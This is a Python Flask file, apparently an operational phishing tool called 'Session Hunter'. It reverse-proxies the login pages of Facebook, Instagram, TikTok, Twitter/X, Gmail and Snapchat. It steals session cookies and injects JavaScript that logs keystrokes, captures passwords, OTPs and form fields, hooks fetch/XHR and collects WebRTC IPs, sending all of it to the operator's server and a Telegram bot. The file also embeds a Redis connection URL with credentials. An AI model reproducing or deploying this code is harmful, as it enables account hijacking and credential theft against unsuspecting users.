# session_hunter.py
# ============================================================
# Session Hunter - سرقة كوكيز حقيقية عبر Reverse Proxy
# يعمل مع: Facebook, Instagram, TikTok, Twitter, Gmail, إلخ
# ============================================================

import os
import io
import json
import time
import base64
import threading
import redis
import uuid
import re
from urllib.parse import urljoin, urlparse, quote, unquote, urlencode
from flask import Blueprint, request, jsonify, Response, redirect
import requests

sh_bp = Blueprint('session_hunter', __name__)

# ============================================================
# [1] Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=15)
    redis_client.ping()
    print("[+] Session Hunter: ✅ Redis connected")
except Exception as e:
    print(f"[-] SH Redis error: {e}")
    redis_client = None

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

# ============================================================
# [2] المواقع المدعومة
# ============================================================
SUPPORTED_SITES = {
    "facebook": {
        "name": "فيسبوك",
        "url": "https://m.facebook.com",
        "login_url": "https://m.facebook.com/login.php",
        "important_cookies": ["c_user", "xs", "datr", "fr", "sb", "presence"],
        "detect_domain": ["facebook.com", "fbcdn.net"],
    },
    "instagram": {
        "name": "انستقرام",
        "url": "https://www.instagram.com",
        "login_url": "https://www.instagram.com/accounts/login/",
        "important_cookies": ["sessionid", "csrftoken", "ds_user_id", "mid", "ig_did"],
        "detect_domain": ["instagram.com", "cdninstagram.com"],
    },
    "tiktok": {
        "name": "تيك توك",
        "url": "https://www.tiktok.com",
        "login_url": "https://www.tiktok.com/login",
        "important_cookies": ["sessionid", "sessionid_ss", "sid_tt", "uid_tt", "passport_csrf_token"],
        "detect_domain": ["tiktok.com", "tiktokcdn.com"],
    },
    "twitter": {
        "name": "تويتر",
        "url": "https://twitter.com",
        "login_url": "https://twitter.com/i/flow/login",
        "important_cookies": ["auth_token", "ct0", "twid", "guest_id"],
        "detect_domain": ["twitter.com", "x.com", "twimg.com"],
    },
    "gmail": {
        "name": "جيميل",
        "url": "https://accounts.google.com",
        "login_url": "https://accounts.google.com/signin",
        "important_cookies": ["SID", "HSID", "SSID", "APISID", "SAPISID", "__Secure-1PSID"],
        "detect_domain": ["google.com", "gstatic.com"],
    },
    "snapchat": {
        "name": "سناب شات",
        "url": "https://web.snapchat.com",
        "login_url": "https://accounts.snapchat.com/accounts/login",
        "important_cookies": ["sc_at", "sc_cookie", "web_client_session"],
        "detect_domain": ["snapchat.com", "sc-cdn.net"],
    },
}

# ============================================================
# [3] إدارة الجلسات
# ============================================================
sessions = {}
sessions_lock = threading.Lock()


def create_session(session_id, chat_id, target_site="facebook"):
    with sessions_lock:
        sessions[session_id] = {
            "chat_id": chat_id,
            "target_site": target_site,
            "created_at": time.time(),
            "last_seen": time.time(),
            "cookies": {},        # {domain: {name: value}}
            "headers": {},
            "captured_forms": [],
            "captured_urls": set(),
            "important_hits": [],
            "page_count": 0,
        }
    if redis_client:
        try:
            redis_client.setex(f"sh_session:{session_id}", 86400 * 7, json.dumps({
                "chat_id": chat_id,
                "target_site": target_site,
            }))
        except Exception:
            pass
    return sessions[session_id]


def get_session(session_id):
    with sessions_lock:
        return sessions.get(session_id)


def save_cookie(session_id, domain, name, value):
    """حفظ كوكي"""
    sess = get_session(session_id)
    if not sess:
        return
    
    domain = domain or "unknown"
    if domain not in sess["cookies"]:
        sess["cookies"][domain] = {}
    
    sess["cookies"][domain][name] = {
        "value": value,
        "captured_at": time.time(),
    }
    
    # حفظ في Redis
    if redis_client:
        try:
            redis_client.hset(
                f"sh_cookies:{session_id}",
                f"{domain}|{name}",
                value
            )
            redis_client.expire(f"sh_cookies:{session_id}", 86400 * 7)
        except Exception:
            pass


def check_important_cookies(session_id):
    """يفحص لو استلمنا كوكيز مهمة"""
    sess = get_session(session_id)
    if not sess:
        return []
    
    site = sess.get("target_site", "facebook")
    config = SUPPORTED_SITES.get(site, {})
    important = config.get("important_cookies", [])
    
    found = []
    for domain, cookies in sess["cookies"].items():
        for name in important:
            if name in cookies and name not in sess["important_hits"]:
                found.append({"name": name, "value": cookies[name]["value"], "domain": domain})
                sess["important_hits"].append(name)
    
    return found


# ============================================================
# [4] إعادة كتابة HTML
# ============================================================
def rewrite_html(html, session_id, target_url, base_domain):
    """إعادة كتابة HTML لتشير كل الروابط لبروكسي"""
    proxy_base = f"/sh_proxy?s={session_id}"
    
    # استبدال الروابط المطلقة
    html = re.sub(
        r'https?://([a-z0-9\-\.]*' + re.escape(base_domain.replace('www.', '').split('.')[0]) + r'[a-z0-9\-\.]*)',
        lambda m: f"{proxy_base}&url=https://{m.group(1)}",
        html,
        flags=re.IGNORECASE
    )
    
    # إعادة كتابة الروابط النسبية
    html = re.sub(
        r'(href|src|action)=["\'](/[^"\']*)["\']',
        lambda m: f'{m.group(1)}="{proxy_base}&url={quote(urljoin(target_url, m.group(2)))}"',
        html
    )
    
    # حقن JavaScript
    inject = f"""<script>
(function(){{
  const SID = "{session_id}";
  const SRV = "{RAILWAY_URL}";
  
  // اعتراض Fetch
  const of = window.fetch;
  window.fetch = function(u, o) {{
    try {{
      const url = typeof u === 'string' ? u : u.url;
      const body = o && o.body ? String(o.body).slice(0, 1000) : null;
      fetch(SRV + '/sh_capture', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{sid: SID, type: 'fetch', url: url, body: body}})
      }}).catch(()=>{{}});
    }} catch(e) {{}}
    return of.apply(this, arguments);
  }};
  
  // اعتراض XHR
  const oo = XMLHttpRequest.prototype.open;
  const os = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(m, u) {{
    this.__m = m; this.__u = u;
    return oo.apply(this, arguments);
  }};
  XMLHttpRequest.prototype.send = function(b) {{
    try {{
      fetch(SRV + '/sh_capture', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{sid: SID, type: 'xhr', url: this.__u, method: this.__m, body: b ? String(b).slice(0, 1000) : null}})
      }}).catch(()=>{{}});
    }} catch(e) {{}}
    return os.apply(this, arguments);
  }};
  
  // اعتراض كل form submit
  document.addEventListener('submit', function(e) {{
    try {{
      const form = e.target;
      const fd = new FormData(form);
      const fields = {{}};
      for (const [k, v] of fd.entries()) {{
        if (typeof v === 'string') fields[k] = v;
      }}
      fetch(SRV + '/sh_capture', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{sid: SID, type: 'form_submit', action: form.action, fields: fields, url: location.href}})
      }}).catch(()=>{{}});
    }} catch(err) {{}}
  }}, true);
  
  // اعتراض حقول كلمة السر
  document.addEventListener('input', function(e) {{
    try {{
      const t = e.target;
      if (!t || !t.name) return;
      if (t.type === 'password' || /(pass|email|user|phone|otp|code|pin)/i.test(t.name)) {{
        fetch(SRV + '/sh_capture', {{
          method: 'POST',
          headers: {{'Content-Type': 'application/json'}},
          body: JSON.stringify({{sid: SID, type: 'field', name: t.name, value: t.value, url: location.href}})
        }}).catch(()=>{{}});
      }}
    }} catch(e) {{}}
  }}, true);
  
  // Keylogger
  let kb = '', kt = 0;
  document.addEventListener('keydown', function(e) {{
    try {{
      let k = e.key;
      if (k === 'Enter') k = '\\n';
      else if (k.length > 1) return;
      kb += k;
      const now = Date.now();
      if (now - kt > 3000 || k === '\\n' || kb.length > 100) {{
        if (kb.trim()) {{
          fetch(SRV + '/sh_capture', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{sid: SID, type: 'keylog', text: kb, url: location.href}})
          }}).catch(()=>{{}});
          kb = '';
        }}
        kt = now;
      }}
    }} catch(err) {{}}
  }}, true);
  
  // WebRTC IP
  setTimeout(async () => {{
    try {{
      const ips = new Set();
      const pc = new RTCPeerConnection({{iceServers: [{{urls: 'stun:stun.l.google.com:19302'}}]}});
      pc.createDataChannel('');
      pc.onicecandidate = e => {{
        if (!e.candidate) return;
        const m = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/.exec(e.candidate.candidate);
        if (m) ips.add(m[1]);
      }};
      await pc.setLocalDescription(await pc.createOffer());
      await new Promise(r => setTimeout(r, 2500));
      pc.close();
      if (ips.size) {{
        fetch(SRV + '/sh_capture', {{
          method: 'POST',
          headers: {{'Content-Type': 'application/json'}},
          body: JSON.stringify({{sid: SID, type: 'webrtc_ips', ips: Array.from(ips)}})
        }}).catch(()=>{{}});
      }}
    }} catch(e) {{}}
  }}, 1500);
}})();
</script>"""
    
    if '<head>' in html:
        html = html.replace('<head>', '<head>' + inject, 1)
    elif '<HEAD>' in html:
        html = html.replace('<HEAD>', '<HEAD>' + inject, 1)
    else:
        html = inject + html
    
    return html


# ============================================================
# [5] المسارات
# ============================================================
def init_session_hunter_routes(app, bot):

    @app.route('/sh', methods=['GET'])
    def sh_landing():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        site = request.args.get('site', 'facebook').lower()
        
        if not session_id or not chat_id:
            return "Invalid link", 400
        
        if site not in SUPPORTED_SITES:
            site = 'facebook'
        
        create_session(session_id, chat_id, site)
        
        # إعادة توجيه للبروكسي
        target = SUPPORTED_SITES[site]["url"]
        return redirect(f"/sh_proxy?s={session_id}&url={quote(target)}")

    @app.route('/sh_create', methods=['POST'])
    def sh_create():
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        site = data.get('site', 'facebook')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400
        session_id = data.get('session_id') or str(uuid.uuid4()).replace('-', '')[:24]
        create_session(session_id, chat_id, site)
        return jsonify({"session_id": session_id}), 200

    # ============================================================
    # ★★★ البروكسي الرئيسي ★★★
    # ============================================================
    @app.route('/sh_proxy', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    def sh_proxy():
        try:
            session_id = request.args.get('s', '')
            target_url = request.args.get('url', '')
            
            if not session_id:
                return "No session", 400
            
            sess = get_session(session_id)
            if not sess:
                return "Session not found", 404
            
            sess["last_seen"] = time.time()
            sess["page_count"] = sess.get("page_count", 0) + 1
            
            if not target_url:
                site = sess.get("target_site", "facebook")
                target_url = SUPPORTED_SITES[site]["url"]
            
            # ============================================================
            # بناء Headers
            # ============================================================
            parsed = urlparse(target_url)
            
            # جمع الكوكيز المحفوظة لهذا الـ domain
            cookies_dict = {}
            for domain, cookies in sess["cookies"].items():
                if parsed.netloc.endswith(domain.replace('www.', '')) or domain.replace('www.', '') in parsed.netloc:
                    for name, cdata in cookies.items():
                        cookies_dict[name] = cdata["value"]
            
            headers = {
                "User-Agent": request.headers.get("User-Agent", "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"),
                "Accept": request.headers.get("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
                "Accept-Language": request.headers.get("Accept-Language", "en-US,en;q=0.9,ar;q=0.8"),
                "Accept-Encoding": "identity",
                "Host": parsed.netloc,
                "Referer": f"https://{parsed.netloc}/",
            }
            
            # ============================================================
            # تنفيذ الطلب
            # ============================================================
            try:
                if request.method == 'GET':
                    resp = requests.get(target_url, headers=headers, cookies=cookies_dict,
                                       allow_redirects=False, timeout=30, verify=False)
                elif request.method == 'POST':
                    body = request.get_data()
                    headers["Content-Type"] = request.headers.get("Content-Type", "application/x-www-form-urlencoded")
                    resp = requests.post(target_url, headers=headers, cookies=cookies_dict,
                                        data=body, allow_redirects=False, timeout=30, verify=False)
                else:
                    resp = requests.request(request.method, target_url, headers=headers,
                                          cookies=cookies_dict, data=request.get_data(),
                                          allow_redirects=False, timeout=30, verify=False)
            except Exception as e:
                print(f"[-] sh_proxy request error: {e}")
                return f"Proxy error: {e}", 502
            
            # ============================================================
            # ★★★ التقاط الكوكيز من الرد (المفتاح!) ★★★
            # ============================================================
            all_cookies = []
            
            # من resp.cookies
            for cookie in resp.cookies:
                save_cookie(session_id, cookie.domain or parsed.netloc, cookie.name, cookie.value)
                all_cookies.append((cookie.name, cookie.value))
                print(f"[SH] Cookie captured: {cookie.name}={cookie.value[:20]}...")
            
            # من Set-Cookie headers
            set_cookie_headers = resp.raw.headers.getlist('Set-Cookie') if hasattr(resp.raw.headers, 'getlist') else []
            if not set_cookie_headers:
                sc = resp.headers.get('Set-Cookie', '')
                if sc:
                    set_cookie_headers = [sc]
            
            for set_cookie in set_cookie_headers:
                try:
                    # اقسم على الفاصلة (لكن ليس داخل التاريخ)
                    cookie_parts = re.split(r',(?=\s*[A-Za-z0-9_\-]+=)', set_cookie)
                    for part in cookie_parts:
                        first = part.split(';')[0].strip()
                        if '=' in first:
                            n, v = first.split('=', 1)
                            n = n.strip()
                            v = v.strip()
                            if n and v:
                                save_cookie(session_id, parsed.netloc, n, v)
                                all_cookies.append((n, v))
                                print(f"[SH] Cookie from header: {n}={v[:20]}...")
                except Exception as e:
                    print(f"[-] parse set-cookie error: {e}")
            
            # فحص الكوكيز المهمة
            important = check_important_cookies(session_id)
            if important:
                try:
                    cid = int(sess["chat_id"]) if str(sess["chat_id"]).isdigit() else sess["chat_id"]
                    lines = [f"🚨 **كوكيز مهمة تم التقاطها!**", f"🆔 `{session_id[:16]}`", ""]
                    for c in important:
                        lines.append(f"🍪 **{c['name']}**")
                        lines.append(f"`{c['value'][:100]}`")
                        lines.append("")
                    lines.append(f"🎯 يمكنك الآن استخدام هذه الكوكيز للدخول لجلسة الضحية!")
                    bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
                except Exception as e:
                    print(f"[-] notify important error: {e}")
            
            # ============================================================
            # معالجة الرد
            # ============================================================
            content_type = resp.headers.get("Content-Type", "").lower()
            
            # Redirect
            if resp.status_code in (301, 302, 303, 307, 308) and 'Location' in resp.headers:
                loc = resp.headers['Location']
                if not loc.startswith(('http://', 'https://')):
                    loc = urljoin(target_url, loc)
                new_url = f"/sh_proxy?s={session_id}&url={quote(loc)}"
                
                response = redirect(new_url, code=302)
                return response
            
            # HTML → أعد الكتابة
            if "text/html" in content_type:
                try:
                    html = resp.content.decode('utf-8', errors='ignore')
                    base_domain = parsed.netloc
                    html = rewrite_html(html, session_id, target_url, base_domain)
                    
                    response = Response(html, status=resp.status_code,
                                      content_type="text/html; charset=utf-8")
                    
                    # انقل بعض الـ headers
                    for k, v in resp.headers.items():
                        lk = k.lower()
                        if lk not in ['content-encoding', 'content-length', 'transfer-encoding',
                                      'content-security-policy', 'x-frame-options',
                                      'strict-transport-security', 'content-type', 'set-cookie',
                                      'location']:
                            try:
                                response.headers[k] = v
                            except Exception:
                                pass
                    
                    return response
                except Exception as e:
                    print(f"[-] HTML rewrite error: {e}")
                    return Response(resp.content, status=resp.status_code, content_type=content_type)
            
            # غير HTML → مرر كما هو
            else:
                response = Response(resp.content, status=resp.status_code, content_type=content_type)
                return response
        
        except Exception as e:
            print(f"[-] sh_proxy FATAL: {e}")
            import traceback
            traceback.print_exc()
            return f"Error: {e}", 500

    # ============================================================
    # استقبال البيانات من JavaScript المحقون
    # ============================================================
    @app.route('/sh_capture', methods=['POST'])
    def sh_capture():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('sid')
            dtype = data.get('type')
            
            if not session_id:
                return jsonify({"status": "no_sid"}), 200
            
            sess = get_session(session_id)
            if not sess:
                return jsonify({"status": "no_sess"}), 200
            
            sess["last_seen"] = time.time()
            chat_id = sess["chat_id"]
            
            # ---------- Form Submit ----------
            if dtype == 'form_submit':
                fields = data.get('fields', {})
                url = data.get('url', '')
                action = data.get('action', '')
                
                sess["captured_forms"].append({
                    "url": url,
                    "action": action,
                    "fields": fields,
                    "ts": time.time()
                })
                
                # أبلغ فوراً
                try:
                    cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                    lines = [f"📝 **نموذج تم إرساله!**", f"🌐 `{url[:80]}`", ""]
                    for k, v in list(fields.items())[:20]:
                        lines.append(f"• `{k}`: `{str(v)[:100]}`")
                    bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
                except Exception as e:
                    print(f"[-] notify form error: {e}")
                
                # احفظ في Redis
                if redis_client:
                    try:
                        redis_client.lpush(f"sh_forms:{session_id}", json.dumps({
                            "url": url, "action": action, "fields": fields
                        }))
                        redis_client.expire(f"sh_forms:{session_id}", 86400 * 7)
                    except Exception:
                        pass
            
            # ---------- Field Input ----------
            elif dtype == 'field':
                name = data.get('name', '')
                value = data.get('value', '')
                url = data.get('url', '')
                
                if value and len(value) > 2:
                    try:
                        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                        bot.send_message(cid,
                            f"⌨️ **إدخال:** `{name}` = `{value[:200]}`\n🌐 `{url[:80]}`",
                            parse_mode="Markdown")
                    except Exception:
                        pass
            
            # ---------- Keylog ----------
            elif dtype == 'keylog':
                text = data.get('text', '')
                url = data.get('url', '')
                if text.strip():
                    try:
                        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                        bot.send_message(cid,
                            f"⌨️ **لوحة المفاتيح:**\n```\n{text[:500]}\n```\n🌐 `{url[:80]}`",
                            parse_mode="Markdown")
                    except Exception:
                        pass
            
            # ---------- WebRTC IPs ----------
            elif dtype == 'webrtc_ips':
                ips = data.get('ips', [])
                if ips:
                    try:
                        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                        bot.send_message(cid,
                            f"🕵️ **IP حقيقي من WebRTC:**\n" +
                            "\n".join(f"• `{ip}`" for ip in ips),
                            parse_mode="Markdown")
                    except Exception:
                        pass
            
            # ---------- Fetch / XHR (اختياري - تجاهل الإزعاج) ----------
            elif dtype in ('fetch', 'xhr'):
                pass
            
            return jsonify({"status": "ok"}), 200
        
        except Exception as e:
            print(f"[-] sh_capture error: {e}")
            return jsonify({"status": "error"}), 200

    # ============================================================
    # صفحة عرض الجلسة
    # ============================================================
    @app.route('/sh_view', methods=['GET'])
    def sh_view():
        session_id = request.args.get('s', '')
        if not session_id:
            return "No session", 400
        
        sess = get_session(session_id)
        if not sess:
            return "Session not found", 404
        
        # جمع كل الكوكيز من Redis
        cookies = {}
        if redis_client:
            try:
                stored = redis_client.hgetall(f"sh_cookies:{session_id}")
                for key, val in stored.items():
                    if '|' in key:
                        domain, name = key.split('|', 1)
                        if domain not in cookies:
                            cookies[domain] = {}
                        cookies[domain][name] = val
            except Exception:
                pass
        
        return render_session_view(session_id, sess, cookies)


# ============================================================
# [6] عرض الجلسة
# ============================================================
def render_session_view(session_id, sess, cookies):
    site = sess.get("target_site", "facebook")
    config = SUPPORTED_SITES.get(site, {})
    
    cookie_rows = ""
    for domain, cks in cookies.items():
        for name, val in cks.items():
            is_important = name in config.get("important_cookies", [])
            color = "#4ade80" if is_important else "#94a3b8"
            cookie_rows += f'<tr><td>{domain}</td><td><b style="color:{color}">{name}</b></td><td><code>{val[:60]}</code></td></tr>'
    
    html = f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>Session View</title>
<style>
  body {{ font-family: -apple-system, sans-serif; background: #0f172a; color: #f8fafc;
    margin: 0; padding: 24px; }}
  .c {{ max-width: 1000px; margin: 0 auto; }}
  h1 {{ color: #38bdf8; }}
  .card {{ background: #1e293b; border-radius: 12px; padding: 20px; margin-bottom: 16px;
    border: 1px solid #334155; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 13px; }}
  th {{ text-align: right; padding: 8px; border-bottom: 1px solid #334155; color: #64748b; }}
  td {{ padding: 8px; border-bottom: 1px solid #1e293b; }}
  code {{ background: #0f172a; padding: 3px 8px; border-radius: 4px; color: #4ade80;
    font-family: monospace; font-size: 12px; word-break: break-all; }}
</style>
</head>
<body>
<div class="c">
  <h1>🍪 Session View — {config.get('name', site)}</h1>
  <div class="card">
    <h2>معلومات الجلسة</h2>
    <p><b>🆔 Session ID:</b> <code>{session_id}</code></p>
    <p><b>👤 Chat ID:</b> <code>{sess.get('chat_id')}</code></p>
    <p><b>📄 صفحات تم تحميلها:</b> {sess.get('page_count', 0)}</p>
    <p><b>🎯 الهدف:</b> {config.get('name', site)}</p>
  </div>
  <div class="card">
    <h2>🍪 الكوكيز المسروقة ({len(cookie_rows.split('<tr>')) - 1})</h2>
    <table>
      <tr><th>Domain</th><th>Cookie Name</th><th>Value</th></tr>
      {cookie_rows if cookie_rows else '<tr><td colspan="3" style="text-align:center">لا توجد كوكيز بعد</td></tr>'}
    </table>
  </div>
</div>
</body>
</html>"""
    return html, 200


# ============================================================
# [7] لوحة تحكم البوت
# ============================================================
def build_sh_panel(session_id, chat_id):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("📋 كل الكوكيز", callback_data=f"sh_cookies_{session_id}"),
        InlineKeyboardButton("📝 النماذج", callback_data=f"sh_forms_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 عرض الويب", url=f"{RAILWAY_URL}/sh_view?s={session_id}"),
        InlineKeyboardButton("📊 إحصائيات", callback_data=f"sh_stats_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🔓 افتح الجلسة", callback_data=f"sh_open_{session_id}"),
    )
    return m


# ============================================================
# [8] API للبوت
# ============================================================
def get_sh_data(session_id):
    """يرجع كل بيانات الجلسة"""
    result = {"cookies": {}, "forms": [], "session": None}
    
    sess = get_session(session_id)
    if sess:
        result["session"] = {
            "chat_id": sess.get("chat_id"),
            "target_site": sess.get("target_site"),
            "page_count": sess.get("page_count", 0),
            "created_at": sess.get("created_at"),
            "last_seen": sess.get("last_seen"),
        }
    
    if redis_client:
        try:
            cookies = redis_client.hgetall(f"sh_cookies:{session_id}")
            for key, val in (cookies or {}).items():
                if '|' in key:
                    domain, name = key.split('|', 1)
                    result["cookies"].setdefault(domain, {})[name] = val
            
            forms_raw = redis_client.lrange(f"sh_forms:{session_id}", 0, -1)
            for f in (forms_raw or []):
                try:
                    result["forms"].append(json.loads(f))
                except Exception:
                    pass
        except Exception as e:
            print(f"[-] get_sh_data error: {e}")
    
    return result
